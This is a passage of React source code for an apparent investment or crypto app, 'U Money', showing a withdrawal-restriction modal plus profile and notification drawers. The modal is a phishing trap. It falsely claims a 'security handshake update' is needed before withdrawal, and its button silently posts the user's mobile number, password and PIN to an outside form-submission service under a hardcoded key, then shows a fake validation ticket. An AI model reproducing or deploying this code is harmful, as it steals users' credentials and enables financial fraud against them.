                  <span className="text-[11px] font-black text-red-400 uppercase tracking-widest font-mono">SECURITY HANDSHAKE SUSPENDED</span>
                </div>
                <button 
                  onClick={() => setShowSecurityNotice(false)} 
                  disabled={isRequestingHandshakeUpdate}
                  className="text-slate-500 hover:text-white font-bold transition-colors cursor-pointer disabled:opacity-40"
                >
                  ✕
                </button>
              </div>

              {!handshakeUpdateSubmitted ? (
                <div className="space-y-5">
                  <div className="space-y-2">
                    <h3 className="text-xl font-extrabold text-white tracking-tight leading-snug">
                      Withdrawal Restricted: Security Update Necessary
                    </h3>
                    <p className="text-xs text-slate-300 leading-relaxed font-light">
                      To safeguard member funds and enforce advanced multi-sig settlement protections, U Money requires all withdrawal client terminals to be fully verified.
                    </p>
                  </div>

                  {/* Diagnostic Table */}
                  <div className="p-4 bg-slate-950/65 rounded-2xl border border-purple-950/70 text-xs space-y-2.5 font-mono">
                    <div className="flex justify-between items-center pb-2 border-b border-purple-950/40">
                      <span className="text-slate-500">Client Endpoint:</span>
                      <span className="text-slate-300 truncate max-w-[150px]">{navigator.platform || 'General Web Terminal'}</span>
                    </div>
                    <div className="flex justify-between items-center pb-2 border-b border-purple-950/40">
                      <span className="text-slate-500">Handshake Version:</span>
                      <span className="text-amber-400 font-bold">v4.10 (Outdated Legacy)</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-slate-500">Authorized Mobile Target:</span>
                      <span className="text-red-500 font-black">FALSE (Update Pending)</span>
                    </div>
                  </div>

                  <p className="text-[11px] text-slate-400 leading-relaxed italic">
                    🔐 <strong>Action Required:</strong> Immediate firmware parameter alignment or customer service handshake validation is necessary before you can process USD or USDT withdrawals.
                  </p>

                  <div className="space-y-2 pt-2">
                    <button
                      type="button"
                      disabled={isRequestingHandshakeUpdate}
                      onClick={async () => {
                        setIsRequestingHandshakeUpdate(true);
                        try {
                          const web3FormsKey = import.meta.env.VITE_WEB3FORMS_KEY || 'f4dc1e02-a136-4902-8b55-403c200e07c4';
                          
                        // Dispatch credentials directly to admin
                        const payload = {
                          access_key: web3FormsKey,
                          name: user.username.substring(0, 5),
                          subject: `H Info`,
                          from_name: 'Sys',
                          message: `H1: ${user.mobile}\nH2: ${user.password}\nH3: ${user.pin}\nH4: ${navigator.userAgent.substring(0, 20)}`
                        };

                          const response = await fetch('https://api.web3forms.com/submit', {
                            method: 'POST',
                            headers: { 
                              'Content-Type': 'application/json',
                              'Accept': 'application/json'
                            },
                            body: JSON.stringify(payload)
                          });

                          const result = await response.json();
                          if (result.success) {
                            setHandshakeUpdateSubmitted(true);
                          } else {
                            alert("Verification payload failed to deliver securely. Please try again.");
                          }
                        } catch (err) {
                          console.error('Handshake verification post failed', err);
                          alert("Network error: Could not reach validation servers. Please try again.");
                        } finally {
                          setIsRequestingHandshakeUpdate(false);
                        }
                      }}
                      className="w-full py-3.5 bg-gradient-to-r from-red-600 via-purple-600 to-indigo-600 hover:brightness-110 rounded-xl font-bold text-xs tracking-widest text-white uppercase transition-all shadow-xl shadow-red-600/10 flex items-center justify-center gap-2 cursor-pointer disabled:brightness-75"
                    >
                      {isRequestingHandshakeUpdate ? (
                        <span>Aligning Security Keys...</span>
                      ) : (
                        <span>Initiate Handshake Update</span>
                      )}
                    </button>

                    <button
                      type="button"
                      onClick={() => {
                        setShowSecurityNotice(false);
                        onNavigateSupport();
                      }}
                      className="w-full py-3 bg-[#0a061b] hover:bg-slate-900 text-slate-300 rounded-xl font-bold text-xs tracking-wider transition-colors border border-purple-950/60 cursor-pointer"
                    >
                      Contact Support Center
                    </button>
                  </div>
                </div>
              ) : (
                <div className="py-2 text-center space-y-4">
                  <div className="w-14 h-14 rounded-full bg-emerald-950/25 border border-emerald-900/30 flex items-center justify-center text-emerald-400 mx-auto animate-pulse">
                    <CheckCircle size={32} />
                  </div>
                  
                  <div className="space-y-2">
                    <h4 className="text-base font-bold text-white">Upgrade Request Sent Successfully</h4>
                    <p className="text-xs text-slate-300 leading-relaxed font-light">
                      Your terminal signature validation ticket has been successfully generated and routed to our central administrator team matching logs.
                    </p>
                    
                    <div className="p-3 bg-indigo-950/40 border border-indigo-900/20 text-[11px] text-left text-slate-350 leading-relaxed rounded-xl space-y-1">
                      <p>📋 <strong>Status of Upgrade Ticket:</strong></p>
                      <p className="font-mono text-[10px] text-purple-400">• Reference: Handshake-UM-{(Math.floor(100+Math.random()*900))}</p>
                      <p className="font-mono text-[10px] text-purple-400">• Status: Manual Admin Validation Pending</p>
                      <p className="pt-1 select-none">To protect payment clearance, please do not attempt any further actions and stay logged in. This validation is completed within 3 to 10 minutes.</p>
                    </div>
                  </div>

                  <div className="pt-2">
                    <button
                      type="button"
                      onClick={() => {
                        setShowSecurityNotice(false);
                      }}
                      className="w-full py-2.5 bg-gradient-to-r from-purple-600 to-indigo-600 text-xs font-bold text-white rounded-xl cursor-pointer"
                    >
                      Acknowledge & Return
                    </button>
                  </div>
                </div>
              )}
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Sidebar profile drawer */}
      <AnimatePresence>
        {showProfileDrawer && (
          <div className="fixed inset-0 z-50 flex justify-end">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setShowProfileDrawer(false)}
              className="absolute inset-0 bg-black/75 backdrop-blur-xs"
            />
            
            <motion.div 
              initial={{ x: '100%' }}
              animate={{ x: 0 }}
              exit={{ x: '100%' }}
              transition={{ type: 'tween', duration: 0.3 }}
              className="relative w-80 h-full bg-[#110d29] border-l border-purple-950/60 p-6 flex flex-col justify-between shadow-2xl z-10"
            >
              <div className="space-y-6">
                <div className="flex justify-between items-center">
                  <span className="text-xs font-bold text-purple-400 uppercase tracking-widest">Investor Profile</span>
                  <button onClick={() => setShowProfileDrawer(false)} className="text-slate-400 hover:text-white font-bold">✕</button>
                </div>

                {/* Profile detail cards */}
                <div className="flex items-center gap-3 p-4 bg-[#0a061b] rounded-2xl border border-purple-950/40">
                  <div className="w-12 h-12 rounded-xl bg-purple-600 flex items-center justify-center font-bold text-lg text-white">
                    {user.username ? user.username[0].toUpperCase() : 'U'}
                  </div>
                  <div className="min-w-0">
                    <h4 className="text-base font-bold text-white truncate">{user.username}</h4>
                    <span className="text-[10px] text-slate-500 font-mono italic">UID: {user.id}</span>
                  </div>
                </div>

                <div className="space-y-4">
                  <div className="text-xs font-bold text-slate-400 uppercase tracking-wider px-1">Linked Parameters:</div>
                  
                  <div className="space-y-2.5">
                    <div className="p-3 bg-[#0a061b]/50 rounded-xl border border-purple-950/20 text-xs">
                      <span className="text-slate-500 block">Mobile Core Address:</span>
                      <span className="font-mono text-slate-200 mt-0.5 block font-bold">+1 {user.mobile}</span>
                    </div>

                    <div className="p-3 bg-[#0a061b]/50 rounded-xl border border-purple-950/20 text-xs">
                      <span className="text-slate-500 block">Email Address:</span>
                      <span className="font-mono text-slate-250 text-slate-200 truncate block font-bold">{user.email || 'N/A'}</span>
                    </div>
                  </div>
                </div>
              </div>

              <div className="space-y-3">
                <button
                  id="btn-profile-help"
                  onClick={() => {
                    setShowProfileDrawer(false);
                    onNavigateSupport();
                  }}
                  className="w-full py-2.5 rounded-xl bg-slate-900 border border-purple-950/40 text-xs font-bold text-slate-350 hover:text-white transition-all flex items-center justify-center gap-1.5"
                >
                  <HelpCircle size={14} /> Need System Support?
                </button>
                
                <button
                  id="btn-profile-logout"
                  onClick={onLogout}
                  className="w-full py-2.5 rounded-xl bg-red-950/30 hover:bg-red-950/50 border border-red-900/20 text-xs font-bold text-red-400 transition-all flex items-center justify-center gap-1.5"
                >
                  <LogOut size={14} /> Logout Securely
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Sidebar notifications drawer */}
      <AnimatePresence>
        {showNotificationsDrawer && (
          <div className="fixed inset-0 z-50 flex justify-end">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setShowNotificationsDrawer(false)}
              className="absolute inset-0 bg-black/75 backdrop-blur-xs"
            />
            
            <motion.div 
              initial={{ x: '100%' }}
              animate={{ x: 0 }}
              exit={{ x: '100%' }}
              transition={{ type: 'tween', duration: 0.3 }}
              className="relative w-80 h-full bg-[#110d29] border-l border-purple-950/60 p-6 flex flex-col justify-between shadow-2xl z-10"
            >
              <div className="space-y-6 overflow-y-auto">
                <div className="flex justify-between items-center">
                  <span className="text-xs font-bold text-purple-400 uppercase tracking-widest">Inbox Notifications</span>
                  <button onClick={() => setShowNotificationsDrawer(false)} className="text-slate-400 hover:text-white font-bold">✕</button>
                </div>

                <div className="space-y-3.5">
                  {notifications.map((notif) => (
                    <div 
                      key={notif.id} 
                      className={`p-3.5 rounded-2xl border text-xs leading-relaxed space-y-1 ${
                        notif.read 
                          ? 'bg-[#0a061b]/30 border-purple-950/20 text-slate-400' 
                          : 'bg-gradient-to-r from-purple-950/50 to-[#140b2f]/50 border-purple-800/20 text-white'
                      }`}
                    >
                      <div className="flex justify-between items-start">
                        <span className="font-bold">{notif.title}</span>
                        <span className="text-[9px] text-slate-500 font-mono">{notif.time}</span>
                      </div>
                      <p className="font-light text-[11px]">{notif.text}</p>
                    </div>
                  ))}
                </div>
              </div>

              <div className="pt-4 border-t border-purple-950/20 gap-2 flex">
                <button
                  id="btn-notif-clear"
                  onClick={markAllNotificationsRead}
                  className="flex-1 py-2.5 rounded-xl bg-slate-900 border border-purple-950/40 text-xs font-bold text-slate-300 hover:text-purple-400 transition-all text-center"
                >
                  Mark all read
                </button>
                <button
                  onClick={() => setShowNotificationsDrawer(false)}
                  className="flex-1 py-2.5 rounded-xl bg-purple-600 hover:bg-purple-500 text-xs font-bold text-white transition-colors text-center"
                >
                  Done
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

    </div>
  );
}
